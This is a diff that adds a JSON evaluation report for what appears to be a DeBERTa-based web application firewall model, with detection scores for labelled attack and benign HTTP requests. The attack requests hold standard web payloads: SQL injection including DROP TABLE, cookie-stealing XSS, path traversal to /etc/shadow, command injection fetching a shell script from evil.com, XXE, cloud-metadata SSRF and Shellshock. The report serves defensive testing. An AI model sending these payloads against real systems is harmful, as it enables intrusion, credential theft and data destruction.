@@ -1,0 +1,810 @@
+{
+  "timestamp": "1765117482.5534537",
+  "model_path": "models/deberta-waf/best_model",
+  "threshold": 3.538751955032347,
+  "baseline_stats": {
+    "mean": 1.3791185371122914,
+    "std": 2.0515819612765984,
+    "median": 0.4256705939769745,
+    "percentile_95": 5.549205589294429,
+    "percentile_99": 10.082200469970633,
+    "min": 0.0,
+    "max": 14.488197326660156
+  },
+  "attack_results": [
+    {
+      "attack_type": "SQL Injection",
+      "total": 5,
+      "detected": 5,
+      "missed": 0,
+      "detection_rate": 100.0,
+      "results": [
+        {
+          "label": "SQL Injection",
+          "is_malicious": true,
+          "confidence": 17.202149818309852,
+          "reconstruction_loss": 4.908280563354492,
+          "anomaly_score": 1.7202149818309853,
+          "risk_level": "MEDIUM",
+          "z_score": 1.7202149818309853,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/login.php",
+            "query": {
+              "id": "1' OR '1'='1"
+            },
+            "headers": {},
+            "body": null
+          }
+        },
+        {
+          "label": "SQL Injection",
+          "is_malicious": true,
+          "confidence": 29.80766754699802,
+          "reconstruction_loss": 7.494405841827392,
+          "anomaly_score": 2.980766754699802,
+          "risk_level": "CRITICAL",
+          "z_score": 2.980766754699802,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "POST",
+            "path": "/search",
+            "query": {},
+            "headers": {
+              "content-type": "application/x-www-form-urlencoded"
+            },
+            "body": "username=admin' OR 1=1--&password=anything"
+          }
+        },
+        {
+          "label": "SQL Injection",
+          "is_malicious": true,
+          "confidence": 16.16392841651011,
+          "reconstruction_loss": 4.695280933380127,
+          "anomaly_score": 1.6163928416510112,
+          "risk_level": "MEDIUM",
+          "z_score": 1.6163928416510112,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/users",
+            "query": {
+              "id": "1 UNION SELECT NULL,username,password FROM users--"
+            },
+            "headers": {},
+            "body": null
+          }
+        },
+        {
+          "label": "SQL Injection",
+          "is_malicious": true,
+          "confidence": 11.715707506798749,
+          "reconstruction_loss": 3.7826919555664062,
+          "anomaly_score": 1.171570750679875,
+          "risk_level": "LOW",
+          "z_score": 1.171570750679875,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/product",
+            "query": {
+              "id": "1'; DROP TABLE users--"
+            },
+            "headers": {},
+            "body": null
+          }
+        },
+        {
+          "label": "SQL Injection",
+          "is_malicious": true,
+          "confidence": 23.067826036395843,
+          "reconstruction_loss": 6.111672115325928,
+          "anomaly_score": 2.306782603639584,
+          "risk_level": "HIGH",
+          "z_score": 2.306782603639584,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "POST",
+            "path": "/login",
+            "query": {},
+            "headers": {
+              "content-type": "application/json"
+            },
+            "body": "{\"username\": \"admin\\\"--\", \"password\": \"x\"}"
+          }
+        }
+      ]
+    },
+    {
+      "attack_type": "XSS",
+      "total": 5,
+      "detected": 5,
+      "missed": 0,
+      "detection_rate": 100.0,
+      "results": [
+        {
+          "label": "XSS",
+          "is_malicious": true,
+          "confidence": 15.367656353313315,
+          "reconstruction_loss": 4.531919193267822,
+          "anomaly_score": 1.5367656353313315,
+          "risk_level": "MEDIUM",
+          "z_score": 1.5367656353313315,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/search",
+            "query": {
+              "q": "<script>alert('XSS')</script>"
+            },
+            "headers": {},
+            "body": null
+          }
+        },
+        {
+          "label": "XSS",
+          "is_malicious": true,
+          "confidence": 15.80238152159249,
+          "reconstruction_loss": 4.6211066246032715,
+          "anomaly_score": 1.580238152159249,
+          "risk_level": "MEDIUM",
+          "z_score": 1.580238152159249,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/comment",
+            "query": {
+              "text": "<img src=x onerror=alert(1)>"
+            },
+            "headers": {},
+            "body": null
+          }
+        },
+        {
+          "label": "XSS",
+          "is_malicious": true,
+          "confidence": 22.500949619541583,
+          "reconstruction_loss": 5.995372772216797,
+          "anomaly_score": 2.2500949619541584,
+          "risk_level": "HIGH",
+          "z_score": 2.2500949619541584,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "POST",
+            "path": "/post",
+            "query": {},
+            "headers": {
+              "content-type": "application/json"
+            },
+            "body": "{\"comment\": \"<svg/onload=alert(document.cookie)>\"}"
+          }
+        },
+        {
+          "label": "XSS",
+          "is_malicious": true,
+          "confidence": 15.165241139471735,
+          "reconstruction_loss": 4.490392053127289,
+          "anomaly_score": 1.5165241139471735,
+          "risk_level": "MEDIUM",
+          "z_score": 1.5165241139471735,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/profile",
+            "query": {
+              "name": "javascript:alert('XSS')"
+            },
+            "headers": {},
+            "body": null
+          }
+        },
+        {
+          "label": "XSS",
+          "is_malicious": true,
+          "confidence": 17.349559246354517,
+          "reconstruction_loss": 4.938522815704346,
+          "anomaly_score": 1.7349559246354516,
+          "risk_level": "MEDIUM",
+          "z_score": 1.7349559246354516,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/page",
+            "query": {
+              "data": "<iframe src=javascript:alert(1)>"
+            },
+            "headers": {},
+            "body": null
+          }
+        }
+      ]
+    },
+    {
+      "attack_type": "Path Traversal",
+      "total": 4,
+      "detected": 2,
+      "missed": 2,
+      "detection_rate": 50.0,
+      "results": [
+        {
+          "label": "Path Traversal",
+          "is_malicious": false,
+          "confidence": 5.2743198761676515,
+          "reconstruction_loss": 3.3521068572998045,
+          "anomaly_score": 0.9616912009500316,
+          "risk_level": "LOW",
+          "z_score": 0.9616912009500316,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/download",
+            "query": {
+              "file": "../../../../etc/passwd"
+            },
+            "headers": {},
+            "body": null
+          }
+        },
+        {
+          "label": "Path Traversal",
+          "is_malicious": true,
+          "confidence": 21.27702273018517,
+          "reconstruction_loss": 5.744274139404297,
+          "anomaly_score": 2.127702273018517,
+          "risk_level": "HIGH",
+          "z_score": 2.127702273018517,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/read",
+            "query": {
+              "path": "..\\..\\..\\windows\\system32\\config\\sam"
+            },
+            "headers": {},
+            "body": null
+          }
+        },
+        {
+          "label": "Path Traversal",
+          "is_malicious": true,
+          "confidence": 14.52915607912592,
+          "reconstruction_loss": 4.3598939895629885,
+          "anomaly_score": 1.452915607912592,
+          "risk_level": "MEDIUM",
+          "z_score": 1.452915607912592,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/include",
+            "query": {
+              "page": "../../../../../../etc/shadow"
+            },
+            "headers": {},
+            "body": null
+          }
+        },
+        {
+          "label": "Path Traversal",
+          "is_malicious": false,
+          "confidence": 32.33633558252751,
+          "reconstruction_loss": 2.3944492474198342,
+          "anomaly_score": 0.49490136366560394,
+          "risk_level": "LOW",
+          "z_score": 0.49490136366560394,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/file",
+            "query": {
+              "name": "/etc/passwd%00.jpg"
+            },
+            "headers": {},
+            "body": null
+          }
+        }
+      ]
+    },
+    {
+      "attack_type": "Command Injection",
+      "total": 4,
+      "detected": 4,
+      "missed": 0,
+      "detection_rate": 100.0,
+      "results": [
+        {
+          "label": "Command Injection",
+          "is_malicious": true,
+          "confidence": 16.727554991980607,
+          "reconstruction_loss": 4.810913544893265,
+          "anomaly_score": 1.6727554991980609,
+          "risk_level": "MEDIUM",
+          "z_score": 1.6727554991980609,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/ping",
+            "query": {
+              "host": "127.0.0.1; cat /etc/passwd"
+            },
+            "headers": {},
+            "body": null
+          }
+        },
+        {
+          "label": "Command Injection",
+          "is_malicious": true,
+          "confidence": 28.05330880965753,
+          "reconstruction_loss": 7.134484767913818,
+          "anomaly_score": 2.805330880965753,
+          "risk_level": "CRITICAL",
+          "z_score": 2.805330880965753,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "POST",
+            "path": "/exec",
+            "query": {},
+            "headers": {
+              "content-type": "application/x-www-form-urlencoded"
+            },
+            "body": "cmd=ls | grep secret"
+          }
+        },
+        {
+          "label": "Command Injection",
+          "is_malicious": true,
+          "confidence": 13.223352094601974,
+          "reconstruction_loss": 4.091997599601745,
+          "anomaly_score": 1.3223352094601974,
+          "risk_level": "LOW",
+          "z_score": 1.3223352094601974,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/run",
+            "query": {
+              "command": "whoami && cat /etc/shadow"
+            },
+            "headers": {},
+            "body": null
+          }
+        },
+        {
+          "label": "Command Injection",
+          "is_malicious": true,
+          "confidence": 21.09842988594022,
+          "reconstruction_loss": 5.707634353637696,
+          "anomaly_score": 2.109842988594022,
+          "risk_level": "HIGH",
+          "z_score": 2.109842988594022,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/system",
+            "query": {
+              "exec": "`wget http://evil.com/shell.sh`"
+            },
+            "headers": {},
+            "body": null
+          }
+        }
+      ]
+    },
+    {
+      "attack_type": "LDAP Injection",
+      "total": 2,
+      "detected": 2,
+      "missed": 0,
+      "detection_rate": 100.0,
+      "results": [
+        {
+          "label": "LDAP Injection",
+          "is_malicious": true,
+          "confidence": 24.25489185283611,
+          "reconstruction_loss": 6.355208396911621,
+          "anomaly_score": 2.425489185283611,
+          "risk_level": "HIGH",
+          "z_score": 2.425489185283611,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "POST",
+            "path": "/login",
+            "query": {},
+            "headers": {
+              "content-type": "application/x-www-form-urlencoded"
+            },
+            "body": "username=admin)(&(password=*))&password=x"
+          }
+        },
+        {
+          "label": "LDAP Injection",
+          "is_malicious": true,
+          "confidence": 18.07879182238508,
+          "reconstruction_loss": 5.088130855560303,
+          "anomaly_score": 1.807879182238508,
+          "risk_level": "MEDIUM",
+          "z_score": 1.807879182238508,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/search",
+            "query": {
+              "user": "*)(uid=*))(|(uid=*"
+            },
+            "headers": {},
+            "body": null
+          }
+        }
+      ]
+    },
+    {
+      "attack_type": "XXE",
+      "total": 2,
+      "detected": 2,
+      "missed": 0,
+      "detection_rate": 100.0,
+      "results": [
+        {
+          "label": "XXE",
+          "is_malicious": true,
+          "confidence": 25.1641750372725,
+          "reconstruction_loss": 6.541755294799804,
+          "anomaly_score": 2.51641750372725,
+          "risk_level": "HIGH",
+          "z_score": 2.51641750372725,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "POST",
+            "path": "/upload",
+            "query": {},
+            "headers": {
+              "content-type": "application/xml"
+            },
+            "body": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"
+          }
+        },
+        {
+          "label": "XXE",
+          "is_malicious": true,
+          "confidence": 28.066029847293542,
+          "reconstruction_loss": 7.137094593048095,
+          "anomaly_score": 2.8066029847293543,
+          "risk_level": "CRITICAL",
+          "z_score": 2.8066029847293543,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "POST",
+            "path": "/parse",
+            "query": {},
+            "headers": {
+              "content-type": "text/xml"
+            },
+            "body": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://evil.com/secret\">]><data>&xxe;</data>"
+          }
+        }
+      ]
+    },
+    {
+      "attack_type": "SSRF",
+      "total": 2,
+      "detected": 1,
+      "missed": 1,
+      "detection_rate": 50.0,
+      "results": [
+        {
+          "label": "SSRF",
+          "is_malicious": false,
+          "confidence": 2.7816358915000228,
+          "reconstruction_loss": 3.4403167605400085,
+          "anomaly_score": 1.0046872424951208,
+          "risk_level": "LOW",
+          "z_score": 1.0046872424951208,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/fetch",
+            "query": {
+              "url": "http://localhost:8080/admin"
+            },
+            "headers": {},
+            "body": null
+          }
+        },
+        {
+          "label": "SSRF",
+          "is_malicious": true,
+          "confidence": 21.325161022024425,
+          "reconstruction_loss": 5.754150104522705,
+          "anomaly_score": 2.1325161022024424,
+          "risk_level": "HIGH",
+          "z_score": 2.1325161022024424,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "POST",
+            "path": "/proxy",
+            "query": {},
+            "headers": {
+              "content-type": "application/json"
+            },
+            "body": "{\"target\": \"http://169.254.169.254/latest/meta-data/\"}"
+          }
+        }
+      ]
+    },
+    {
+      "attack_type": "Template Injection",
+      "total": 2,
+      "detected": 1,
+      "missed": 1,
+      "detection_rate": 50.0,
+      "results": [
+        {
+          "label": "Template Injection",
+          "is_malicious": false,
+          "confidence": 21.004319453034277,
+          "reconstruction_loss": 2.795461189746857,
+          "anomaly_score": 0.6903661074077905,
+          "risk_level": "LOW",
+          "z_score": 0.6903661074077905,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/render",
+            "query": {
+              "name": "{{7*7}}"
+            },
+            "headers": {},
+            "body": null
+          }
+        },
+        {
+          "label": "Template Injection",
+          "is_malicious": true,
+          "confidence": 22.64491359224173,
+          "reconstruction_loss": 6.02490816116333,
+          "anomaly_score": 2.2644913592241727,
+          "risk_level": "HIGH",
+          "z_score": 2.2644913592241727,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "POST",
+            "path": "/template",
+            "query": {},
+            "headers": {
+              "content-type": "application/json"
+            },
+            "body": "{\"template\": \"{{config.items()}}\"}"
+          }
+        }
+      ]
+    },
+    {
+      "attack_type": "NoSQL Injection",
+      "total": 2,
+      "detected": 1,
+      "missed": 1,
+      "detection_rate": 50.0,
+      "results": [
+        {
+          "label": "NoSQL Injection",
+          "is_malicious": true,
+          "confidence": 25.15701776852728,
+          "reconstruction_loss": 6.540286922454834,
+          "anomaly_score": 2.515701776852728,
+          "risk_level": "HIGH",
+          "z_score": 2.515701776852728,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "POST",
+            "path": "/login",
+            "query": {},
+            "headers": {
+              "content-type": "application/json"
+            },
+            "body": "{\"username\": {\"$ne\": null}, \"password\": {\"$ne\": null}}"
+          }
+        },
+        {
+          "label": "NoSQL Injection",
+          "is_malicious": false,
+          "confidence": 1.8890544920835046,
+          "reconstruction_loss": 3.4719030022621156,
+          "anomaly_score": 1.0200832843390706,
+          "risk_level": "LOW",
+          "z_score": 1.0200832843390706,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/user",
+            "query": {
+              "id": "1' || '1'=='1"
+            },
+            "headers": {},
+            "body": null
+          }
+        }
+      ]
+    },
+    {
+      "attack_type": "HTTP Header Injection",
+      "total": 2,
+      "detected": 1,
+      "missed": 1,
+      "detection_rate": 50.0,
+      "results": [
+        {
+          "label": "HTTP Header Injection",
+          "is_malicious": true,
+          "confidence": 11.510459914368923,
+          "reconstruction_loss": 3.7405837297439577,
+          "anomaly_score": 1.1510459914368922,
+          "risk_level": "LOW",
+          "z_score": 1.1510459914368922,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/redirect",
+            "query": {
+              "url": "http://example.com\r\nSet-Cookie: admin=true"
+            },
+            "headers": {},
+            "body": null
+          }
+        },
+        {
+          "label": "HTTP Header Injection",
+          "is_malicious": false,
+          "confidence": 40.812758258129804,
+          "reconstruction_loss": 2.094489674270153,
+          "anomaly_score": 0.348692448393688,
+          "risk_level": "LOW",
+          "z_score": 0.348692448393688,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/page",
+            "query": {},
+            "headers": {
+              "X-Custom": "test\r\nInjected-Header: malicious"
+            },
+            "body": null
+          }
+        }
+      ]
+    },
+    {
+      "attack_type": "Shellshock",
+      "total": 1,
+      "detected": 1,
+      "missed": 0,
+      "detection_rate": 100.0,
+      "results": [
+        {
+          "label": "Shellshock",
+          "is_malicious": true,
+          "confidence": 28.42109257375451,
+          "reconstruction_loss": 7.209938621520996,
+          "anomaly_score": 2.842109257375451,
+          "risk_level": "CRITICAL",
+          "z_score": 2.842109257375451,
+          "threshold": 3.538751955032347,
+          "request": {
+            "method": "GET",
+            "path": "/cgi-bin/test.sh",
+            "query": {},
+            "headers": {
+              "user-agent": "() { :; }; /bin/bash -c 'cat /etc/passwd'"
+            },
+            "body": null
+          }
+        }
+      ]
+    }
+  ],
+  "benign_results": {
+    "total": 5,
+    "false_positives": 4,
+    "correct": 1,
+    "false_positive_rate": 80.0,
+    "results": [
+      {
+        "label": "Benign",
+        "is_malicious": true,
+        "confidence": 19.13232323423602,
+        "reconstruction_loss": 5.304271459579468,
+        "anomaly_score": 1.9132323234236017,
+        "risk_level": "MEDIUM",
+        "z_score": 1.9132323234236017,
+        "threshold": 3.538751955032347,
+        "request": {
+          "method": "GET",
+          "path": "/index.html",
+          "query": {},
+          "headers": {
+            "user-agent": "Mozilla/5.0"
+          },
+          "body": null
+        }
+      },
+      {
+        "label": "Benign",
+        "is_malicious": true,
+        "confidence": 28.049041037731186,
+        "reconstruction_loss": 7.133609199523926,
+        "anomaly_score": 2.8049041037731186,
+        "risk_level": "CRITICAL",
+        "z_score": 2.8049041037731186,
+        "threshold": 3.538751955032347,
+        "request": {
+          "method": "POST",
+          "path": "/login",
+          "query": {},
+          "headers": {
+            "content-type": "application/x-www-form-urlencoded"
+          },
+          "body": "username=john&password=secretpass123"
+        }
+      },
+      {
+        "label": "Benign",
+        "is_malicious": true,
+        "confidence": 18.481160351916042,
+        "reconstruction_loss": 5.170680057257414,
+        "anomaly_score": 1.8481160351916042,
+        "risk_level": "MEDIUM",
+        "z_score": 1.8481160351916042,
+        "threshold": 3.538751955032347,
+        "request": {
+          "method": "GET",
+          "path": "/api/users",
+          "query": {
+            "page": "1",
+            "limit": "10"
+          },
+          "headers": {
+            "authorization": "Bearer token123"
+          },
+          "body": null
+        }
+      },
+      {
+        "label": "Benign",
+        "is_malicious": true,
+        "confidence": 23.07915090226617,
+        "reconstruction_loss": 6.113995504379273,
+        "anomaly_score": 2.3079150902266172,
+        "risk_level": "HIGH",
+        "z_score": 2.3079150902266172,
+        "threshold": 3.538751955032347,
+        "request": {
+          "method": "POST",
+          "path": "/api/data",
+          "query": {},
+          "headers": {
+            "content-type": "application/json"
+          },
+          "body": "{\"name\": \"John Doe\", \"email\": \"john@example.com\"}"
+        }
+      },
+      {
+        "label": "Benign",
+        "is_malicious": false,
+        "confidence": 0.6071518535441632,
+        "reconstruction_loss": 3.5172663569450378,
+        "anomaly_score": 1.0421946869245635,
+        "risk_level": "LOW",
+        "z_score": 1.0421946869245635,
+        "threshold": 3.538751955032347,
+        "request": {
+          "method": "GET",
+          "path": "/search",
+          "query": {
+            "q": "normal search query"
+          },
+          "headers": {},
+          "body": null
+        }
+      }
+    ]
+  }
+}
